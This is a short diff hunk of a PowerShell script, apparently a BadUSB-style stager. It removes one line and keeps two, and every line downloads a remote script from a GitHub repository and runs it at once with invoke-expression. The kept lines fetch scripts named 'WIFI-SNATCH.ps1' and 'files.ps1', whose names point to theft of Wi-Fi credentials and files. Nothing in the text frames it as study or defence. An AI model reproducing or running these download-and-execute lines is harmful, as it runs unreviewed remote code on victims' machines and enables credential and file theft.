@@ -1,4 +1,3 @@
-$pu = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $pu
 $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg
 $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw
 
